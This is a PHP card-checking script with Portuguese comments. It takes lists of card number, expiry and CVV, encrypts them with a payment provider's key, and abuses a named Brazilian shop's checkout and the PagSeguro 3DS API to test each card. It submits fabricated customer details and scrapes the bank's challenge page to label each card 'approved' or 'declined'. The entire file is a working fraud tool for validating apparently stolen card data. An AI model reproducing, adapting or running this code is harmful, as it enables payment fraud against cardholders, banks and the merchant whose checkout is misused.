<?php

// Handler global: garante que sempre seja retornado JSON válido
set_exception_handler(function($e) {
    if (!headers_sent()) {
        header('Content-Type: application/json');
    }
    http_response_code(500);
    echo json_encode([
        'status'  => 'error',
        'message' => 'Exceção PHP: ' . $e->getMessage()
    ]);
    exit;
});

register_shutdown_function(function() {
    $error = error_get_last();
    if ($error && in_array($error['type'], [E_ERROR, E_PARSE, E_CORE_ERROR, E_COMPILE_ERROR])) {
        if (!headers_sent()) {
            header('Content-Type: application/json');
        }
        http_response_code(500);
        echo json_encode([
            'status'  => 'error',
            'message' => 'Erro fatal PHP: ' . $error['message']
        ]);
    }
});

require __DIR__ . '/../vendor/autoload.php';

use GuzzleHttp\Client;
use GuzzleHttp\Cookie\CookieJar as GuzzleCookieJar;

// ─── Helpers ────────────────────────────────────────────────────────────────

function parseCard($lista) {
    $parts = explode('|', $lista);
    if (count($parts) < 4) return false;
    $ano = trim($parts[2]);
    return [
        'cc'   => trim($parts[0]),
        'mes'  => trim($parts[1]),
        'ano'  => $ano,
        'ano2' => substr($ano, -2),
        'cvv'  => trim($parts[3]),
        'full' => $lista,
    ];
}

// CHAVE CORRETA (VZ1NFJ2, igual ao script original)
$PAGBANK_PUBLIC_KEY = 'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAohY3No2y7wJ3mmynx81tfeCnmd80k6c4ZiacJuLG7dP1JscTu0ivKXs5H+DClSKMIlKESm4XF4kUDvuFWqfz1c/NlzeGZ2ZA1EPByxLMyRDwxBT2aaxs6AB/VZ1NFJ2hiUrM96T86KljA/sPhGYqCAw5NAXMp4RhrYDrhw6b//DVzihiXxth/3UQC3FeRqcJhU7znwPTmkFqIjpFBUK7vTjqQ8eC/03vijL99/mn1ikLXogk4D109nO8wV3NAliW/9Ai3eslPKLH9dI/UgKlEh+qdnjo99hVr93Q3Mn4FX++tBh5UFA5q5fxV+8mSREG0aIq4Sgi6VcK0wKp6BkyqwIDAQAB';

function encryptCard($number, $month, $year, $cvv) {
    global $PAGBANK_PUBLIC_KEY;
    $pan       = preg_replace('/\D/', '', $number);
    $month     = str_pad($month, 2, '0', STR_PAD_LEFT);
    $year      = strlen($year) == 2 ? '20' . $year : $year;
    $holder    = 'TITULAR DO CARTAO';
    $timestamp = round(microtime(true) * 1000);
    $payload   = "$pan;$cvv;$month;$year;$holder;$timestamp";
    $lines     = str_split($PAGBANK_PUBLIC_KEY, 64);
    $pem       = "-----BEGIN PUBLIC KEY-----\n" . implode("\n", $lines) . "\n-----END PUBLIC KEY-----";
    $publicKey = openssl_pkey_get_public($pem);
    if (!$publicKey) return null;
    openssl_public_encrypt($payload, $encrypted, $publicKey, OPENSSL_PKCS1_PADDING);
    return base64_encode($encrypted);
}

function detectCardBrand($number) {
    $number   = preg_replace('/\D/', '', $number);
    $patterns = [
        'visa'      => '/^4[0-9]{12}(?:[0-9]{3})?$/',
        'mastercard'=> '/^5[1-5][0-9]{14}$|^2(?:2(?:2[1-9]|[3-9][0-9])|[3-6][0-9][0-9]|7(?:[01][0-9]|20))[0-9]{12}$/',
        'amex'      => '/^3[47][0-9]{13}$/',
        'elo'       => '/^((((636368)|(438935)|(504175)|(451416)|(636297))\d{0,10})|((5067)|(4576)|(4011))\d{0,12})$/',
        'hipercard' => '/^(606282\d{10}(\d{3})?)|(3841\d{15})$/',
        'diners'    => '/^3(?:0[0-5]|[68][0-9])[0-9]{11}$/',
        'discover'  => '/^6(?:011|5[0-9]{2})[0-9]{12}$/',
        'jcb'       => '/^(?:2131|1800|35\d{3})\d{11}$/',
    ];
    foreach ($patterns as $brand => $pattern) {
        if (preg_match($pattern, $number)) return strtoupper($brand);
    }
    return 'UNKNOWN';
}

function detectBankFromBin($bin) {
    $banks = [
        '4011' => 'ITAU',    '4012' => 'ITAU',    '4013' => 'ITAU',    '4014' => 'ITAU',
        '4515' => 'ITAU',    '4516' => 'ITAU',    '4517' => 'ITAU',    '4518' => 'ITAU',
        '4551' => 'BRADESCO','4902' => 'BRADESCO', '4903' => 'BRADESCO','5555' => 'BRADESCO',
        '5556' => 'BRADESCO','5448' => 'SANTANDER','5449' => 'SANTANDER','4001' => 'SANTANDER',
        '4002' => 'SANTANDER','4389' => 'BB',      '4390' => 'BB',      '5067' => 'BB',
        '5068' => 'BB',      '4514' => 'CAIXA',   '5501' => 'CAIXA',   '5502' => 'CAIXA',
        '5162' => 'NUBANK',  '5163' => 'NUBANK',  '5122' => 'SICREDI', '5123' => 'SICREDI',
        '5277' => 'BTG',     '5278' => 'BTG',     '4444' => 'INTER',   '5566' => 'INTER',
        '5225' => 'C6_BANK', '5226' => 'C6_BANK',
    ];
    $bin4 = substr($bin, 0, 4);
    $bin6 = substr($bin, 0, 6);
    foreach ($banks as $prefix => $bank) {
        if ($prefix === $bin6 || $prefix === $bin4) return $bank;
    }
    return 'UNKNOWN';
}

function clean_html($text) {
    if (!$text) return '';
    $text = preg_replace('/<script[^>]*>.*?<\/script>/is', '', $text);
    $text = preg_replace('/<style[^>]*>.*?<\/style>/is', '', $text);
    $replacements = [
        '&nbsp;'=>' ','&amp;'=>'&','&lt;'=>'<','&gt;'=>'>','&quot;'=>'"',
        '&apos;'=>"'",'&hellip;'=>'...','&aacute;'=>'á','&Aacute;'=>'Á',
        '&atilde;'=>'ã','&Atilde;'=>'Ã','&eacute;'=>'é','&Eacute;'=>'É',
        '&ecirc;'=>'ê','&Ecirc;'=>'Ê','&iacute;'=>'í','&oacute;'=>'ó',
        '&Oacute;'=>'Ó','&ocirc;'=>'ô','&Ocirc;'=>'Ô','&otilde;'=>'õ',
        '&uacute;'=>'ú','&Uacute;'=>'Ú','&ccedil;'=>'ç','&Ccedil;'=>'Ç',
        '&#225;'=>'á','&#224;'=>'à','&#226;'=>'â','&#227;'=>'ã',
        '&#233;'=>'é','&#232;'=>'è','&#234;'=>'ê','&#237;'=>'í',
        '&#243;'=>'ó','&#244;'=>'ô','&#245;'=>'õ','&#250;'=>'ú',
        '&#251;'=>'û','&#231;'=>'ç',
    ];
    $text = strtr($text, $replacements);
    $text = preg_replace('/<br\s*\/?>/i', "\n", $text);
    $text = preg_replace('/<[^>]*>/', ' ', $text);
    $text = preg_replace('/\s+/', ' ', $text);
    $text = preg_replace('/Estabelecimento:\s*Sandro Gonçalves de Jesus/i', '', $text);
    $text = preg_replace('/Estabelecimento:\s*FABIO DE MORAIS DANTAS/i', '', $text);
    return trim($text);
}

function extractBankFields($html) {
    $patterns = [
        '/<p[^>]*id="Body1"[^>]*>(.*?)<\/p>/is',
        '/<div class="challengeInfoText">(.*?)<\/div>/is',
        '/id="CredentialId-0a-label">(.*?)<\/label>/is',
        '/id="info_message_auth">(.*?)<\/div>/is',
        '/<div class="container_body_text">(.*?)<\/div>/is',
        '/<div id="info_message_auth">.*?<p>\s*([^,]*),/s',
        '/<label[^>]*>(Chave titular Ref final \d+)<\/label>/i',
        '/<span[^>]*id=["\']contentBlock-text["\'][^>]*>(\+?\d+)<\/span>/i',
        '/<div[^>]*class="[^"]*mensagem[^"]*"[^>]*>(.*?)<\/div>/is',
        '/<p[^>]*class="[^"]*texto[^"]*"[^>]*>(.*?)<\/p>/is',
        '/id="textoMensagem"[^>]*>(.*?)<\/[^>]+>/is',
        '/<div[^>]*class="[^"]*error[^"]*"[^>]*>(.*?)<\/div>/is',
        '/<div[^>]*class="[^"]*success[^"]*"[^>]*>(.*?)<\/div>/is',
        '/<body[^>]*>(.*?)<\/body>/is',
    ];
    foreach ($patterns as $pattern) {
        if (preg_match($pattern, $html, $match)) {
            $text = clean_html($match[1]);
            if (!empty($text) && strlen($text) > 3) return $text;
        }
    }
    // Fallback: strip all tags
    $text = preg_replace('/<script[^>]*>.*?<\/script>/is', '', $html);
    $text = preg_replace('/<style[^>]*>.*?<\/style>/is', '', $text);
    $text = strip_tags($text);
    $text = trim(preg_replace('/\s+/', ' ', $text));
    if (strlen($text) > 10) return substr($text, 0, 300) . (strlen($text) > 300 ? '...' : '');
    return 'mensagem vbv não capturada';
}

// ─── HTTP helper usando Guzzle com http_errors=false ────────────────────────

function makeClient(GuzzleCookieJar $jar): Client {
    return new Client([
        'cookies'         => $jar,
        'http_errors'     => false,   // NUNCA lança exceção em 4xx/5xx
        'allow_redirects' => true,
        'timeout'         => 25,
        'headers'         => [
            'User-Agent'      => 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            'Accept'          => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
        ],
    ]);
}

function httpGet(Client $client, string $url, array $headers = []): array {
    try {
        $res  = $client->get($url, ['headers' => $headers]);
        return ['body' => (string) $res->getBody(), 'error' => null];
    } catch (\Throwable $e) {
        return ['body' => '', 'error' => $e->getMessage()];
    }
}

function httpPost(Client $client, string $url, string $body, array $headers = []): array {
    try {
        $res  = $client->post($url, ['body' => $body, 'headers' => $headers]);
        return ['body' => (string) $res->getBody(), 'error' => null];
    } catch (\Throwable $e) {
        return ['body' => '', 'error' => $e->getMessage()];
    }
}

function between(string $haystack, string $start, string $end): string {
    $pos = strpos($haystack, $start);
    if ($pos === false) return '';
    $pos += strlen($start);
    $endPos = strpos($haystack, $end, $pos);
    if ($endPos === false) return '';
    return substr($haystack, $pos, $endPos - $pos);
}

// ─── Lógica principal ────────────────────────────────────────────────────────

header('Content-Type: application/json');

try {

    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        http_response_code(405);
        echo json_encode(['status' => 'error', 'message' => 'Método não permitido.']);
        exit;
    }

    $input = json_decode(file_get_contents('php://input'), true);
    $lista = $input['lista'] ?? null;

    if (!$lista) {
        http_response_code(400);
        echo json_encode(['status' => 'error', 'message' => 'Parâmetro "lista" ausente ou inválido.']);
        exit;
    }

    $time_start = microtime(true);

    $card = parseCard($lista);
    if (!$card) {
        echo json_encode(['status' => 'declined', 'message' => 'Lista inválida!', 'brand' => 'UNKNOWN', 'bank' => 'UNKNOWN', 'time' => '0s']);
        exit;
    }

    $cc    = $card['cc'];
    $mes   = $card['mes'];
    $ano2  = $card['ano2'];
    $cvv   = $card['cvv'];

    $brand = detectCardBrand($cc);
    $bank  = detectBankFromBin($cc);

    $elapsed = function() use ($time_start) {
        return round(microtime(true) - $time_start, 2) . 's';
    };

    $respond = function(string $status, string $message) use ($brand, $bank, $elapsed) {
        echo json_encode([
            'status'  => $status,
            'message' => $message,
            'brand'   => $brand,
            'bank'    => $bank,
            'time'    => $elapsed(),
        ]);
        exit;
    };

    // Criptografar cartão
    $encrypted_hash = encryptCard($cc, $mes, $ano2, $cvv);
    if (!$encrypted_hash) {
        $respond('declined', 'Erro na criptografia do cartão');
    }

    // Cookie jar compartilhado entre TODAS as requisições (igual ao script original)
    $jar    = new GuzzleCookieJar();
    $client = makeClient($jar);

    // Step 1: Add to cart (cria sessão e cookie de carrinho)
    $r1 = httpGet($client, 'https://conteudoemais.com.br/finalizar-compra/?add-to-cart=30157');
    if ($r1['error']) {
        $respond('declined', 'Erro ao adicionar ao carrinho: ' . $r1['error']);
    }

    // Step 2: Página de checkout para capturar o session 3DS
    $r2 = httpGet($client, 'https://conteudoemais.com.br/finalizar-compra/');
    if ($r2['error']) {
        $respond('declined', 'Erro ao carregar checkout: ' . $r2['error']);
    }

    $ps_session = between($r2['body'], "var pagseguro_connect_3d_session = '", "'");
    if (empty($ps_session)) {
        // Debug: retorna trecho do body para diagnóstico
        $snippet = substr(strip_tags($r2['body']), 0, 400);
        $respond('declined', 'Erro ao capturar session 3DS. Body: ' . $snippet);
    }

    // Headers para o PagSeguro SDK (formato correto para Guzzle)
    $psHeaders = [
        'Content-Type'  => 'application/json',
        'Authorization' => $ps_session,
    ];

    // Step 3: Autenticação 3DS
    $postBody = json_encode([
        'paymentMethod' => [
            'type'         => 'CREDIT_CARD',
            'installments' => 1,
            'card'         => ['encrypted' => $encrypted_hash],
        ],
        'dataOnly' => false,
        'customer' => [
            'name'   => 'Nocyam Solo',
            'email'  => 'geudgziwb@gmail.com',
            'phones' => [['country' => '55', 'area' => '14', 'number' => '998543793', 'type' => 'MOBILE']],
        ],
        'amount' => ['value' => 999, 'currency' => 'BRL'],
        'billingAddress' => [
            'street'     => 'Rua Conde de Baependi, 14',
            'number'     => 'n/d',
            'complement' => 'n/d',
            'regionCode' => 'SP',
            'country'    => 'BRA',
            'city'       => 'Rio de janeiro',
            'postalCode' => '22231140',
        ],
        'deviceInformation' => [
            'httpBrowserColorDepth'        => 24,
            'httpBrowserJavaEnabled'       => false,
            'httpBrowserJavaScriptEnabled' => true,
            'httpBrowserLanguage'          => 'pt-BR',
            'httpBrowserScreenHeight'      => 412,
            'httpBrowserScreenWidth'       => 915,
            'httpBrowserTimeDifference'    => 180,
            'httpDeviceChannel'            => 'Browser',
            'userAgentBrowserValue'        => 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        ],
    ]);

    $r3   = httpPost($client, 'https://sdk.pagseguro.com/checkout-sdk/3ds/authentications', $postBody, $psHeaders);
    $data = json_decode($r3['body'], true);

    $three_ds_id = $data['id'] ?? '';
    if (!$three_ds_id) {
        $msg = $data['message'] ?? ($data['status'] ?? ('Falha na autenticação. Resposta: ' . substr($r3['body'], 0, 200)));
        $respond('declined', $msg);
    }

    // Step 4: Confirmar autenticação 3DS
    $r4          = httpPost($client, 'https://sdk.pagseguro.com/checkout-sdk/3ds/authentications/' . $three_ds_id, '', $psHeaders);
    $confirmData = json_decode($r4['body'], true);

    if (!isset($confirmData['status'])) {
        $respond('declined', 'Resposta inválida na confirmação 3DS: ' . substr($r4['body'], 0, 200));
    }

    if ($confirmData['status'] === 'SUCCESS') {
        $respond('approved', 'Transação aprovada - 3DS SUCCESS');
    }

    if ($confirmData['status'] === 'REQUIRE_CHALLENGE') {
        $challenge = $confirmData['challenge'] ?? [];
        $acs_url   = $challenge['acsUrl'] ?? '';
        $creq      = $challenge['payload'] ?? '';

        if (!$acs_url || !$creq) {
            $respond('declined', 'REQUIRE_CHALLENGE mas ACS URL ou CReq ausentes');
        }

        // Step 5: Postar desafio no banco e capturar mensagem VBV
        $r5      = httpPost($client, $acs_url, 'creq=' . $creq, ['Content-Type' => 'application/x-www-form-urlencoded']);
        $message = extractBankFields($r5['body']);

        $msg_lower = strtolower($message);
        $declined  = strpos($msg_lower, 'compra não concluída') !== false
                  || strpos($msg_lower, 'reprovada') !== false
                  || strpos($msg_lower, 'inválido') !== false
                  || strpos($msg_lower, 'negada') !== false
                  || strpos($msg_lower, 'recusada') !== false
                  || strpos($msg_lower, 'cancelada') !== false
                  || strpos($msg_lower, 'não autorizada') !== false;

        $respond($declined ? 'declined' : 'approved', $message);
    }

    // Qualquer outro status
    $msg = $confirmData['message'] ?? ($confirmData['status'] ?? 'Status desconhecido');
    $respond('declined', $msg);

} catch (\Throwable $e) {
    http_response_code(500);
    echo json_encode([
        'status'  => 'error',
        'message' => 'Erro interno: ' . $e->getMessage(),
    ]);
}
